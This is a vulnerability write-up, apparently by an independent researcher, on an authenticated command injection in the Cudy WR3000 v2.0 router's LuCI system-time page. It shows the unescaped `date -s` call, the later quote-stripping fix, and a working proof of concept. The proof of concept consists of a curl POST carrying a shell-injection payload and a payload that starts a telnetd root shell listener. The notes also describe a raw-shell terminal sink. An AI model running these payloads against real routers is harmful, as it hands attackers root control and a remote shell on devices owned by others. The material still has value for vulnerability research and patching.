# Cudy WR3000 v2.0: authenticated command injection in the system time page (root)

Found and verified on my own device during personal firmware research, 2026-09-30.

## Target

- Cudy WR3000 v2.0 (HiSilicon "luofu" platform, OpenWrt 22.03.6 based firmware, target `hisilicon/luofu`, kernel 5.10.201).
- Verified vulnerable on firmware 2.4.15-20251030-114751 (R116).
- Fixed in 2.5.24-20260727-122111: the same code now strips single quotes before formatting. See the bytecode note below.

## Vulnerability

The LuCI derived admin UI builds a shell command from a submitted form value without escaping it.

File: `/usr/lib/lua/luci/model/cbi/system/systime.lua` (compiled Lua inside the firmware).

The write callback of the time field executes, in 2.4.15:

    luci.sys.call(string.format("date -s '%s'", <submitted timeclock value>))

The value is wrapped in single quotes but is not escaped, so a value containing a single quote (`'`) terminates the quoted string and injects shell commands. LuCI runs as root on this firmware, so injected commands execute as root.

In 2.5.24 the same callback strips quotes first:

    luci.sys.call(string.format("date -s '%s'", value:gsub("'", "")))

which closes the injection.

## Prerequisites

- An authenticated admin session on the web UI (any admin account). No extra privileges are required.

## Proof of concept

1. Log in and open `/cgi-bin/luci/admin/system/systime`. Grab the CSRF `token` and your session cookie from the page or browser.
2. Submit the form the way the UI does, with the time fields replaced by a payload. Example payload:

       '; id > /www/luci-static/pwned.txt; #

   curl example, reusing an authenticated cookie jar and the token from step 1:

       curl -s -b cookies.txt -X POST "http://192.168.10.1/cgi-bin/luci/admin/system/systime" \
         --data-urlencode "token=<token>" \
         --data-urlencode "cbi.submit=1" \
         --data-urlencode "cbid.system.ntp.current=PAYLOAD" \
         --data-urlencode "timeclock=PAYLOAD"

   with PAYLOAD = `'; id>/www/luci-static/pwned.txt; /usr/sbin/telnetd -l /bin/sh; #`
   (the second command is optional; it starts a root shell listener on port 23).
3. The commands run as root. In testing, the written file contained `uid=0(root) gid=0(root)` and the listener gave an unrestricted root shell. The same primitive was used to install a persistent SSH service on the device.

## Impact

- Authenticated attacker (or anyone who holds the admin password, or who chains any authentication bypass) gets root command execution.

## Notes

- A sibling latent sink exists in `/usr/lib/lua/luci/model/cbi/system/terminal.lua`: the handler runs `luci.util.exec(luci.http.formvalue("cbid.syslog.1.cmd"))` with no validation, i.e. raw shell. On the tested build the route `/cgi-bin/luci/admin/system/terminal` returns 403 at the web server, so it was not exploitable as shipped, but the sink is real if that route ever becomes reachable.
- On this build `luci.http.formvaluex` URL-encodes its result (which neutralizes several other shell sinks that use it), while plain `luci.http.formvalue` does not. The systime path uses the raw formvalue, which is why it is exploitable.
- Offline verification: extract `systime.lua` from both firmware images. The constant `date -s '%s'` is present in both, but 2.5.24 adds the `gsub("'", "")` step before formatting.

## Disclosure

Documented here for reference. The vendor has not been contacted about this finding yet.
